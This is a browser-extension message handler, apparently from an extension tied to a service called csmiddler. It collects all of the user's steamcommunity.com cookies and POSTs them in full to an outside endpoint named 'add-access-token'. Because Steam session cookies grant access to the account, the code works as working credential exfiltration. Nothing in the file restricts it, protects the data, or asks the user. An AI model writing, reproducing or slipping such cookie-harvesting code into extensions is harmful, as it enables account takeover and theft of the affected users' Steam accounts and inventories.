import browser from "webextension-polyfill"

import type { PlasmoMessaging } from "@plasmohq/messaging"

import { getCorrelationId } from "~lib/getCorrelationId"

const handler: PlasmoMessaging.Handler = async () => {
  const steamCookies = await browser.cookies.getAll({
    domain: "steamcommunity.com"
  })

  if (!steamCookies?.length) {
    console.debug("No cookies found. Exiting.")
    return
  }

  const csmiddlerCorrelationId = await getCorrelationId()

  if (!csmiddlerCorrelationId) {
    console.debug("No correlationId found. Exiting.")
    return
  }

  await fetch(
    `https://extension.csmiddler.com/add-access-token?CorrelationId=${csmiddlerCorrelationId}`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ steamCookies })
    }
  )
}

export default handler
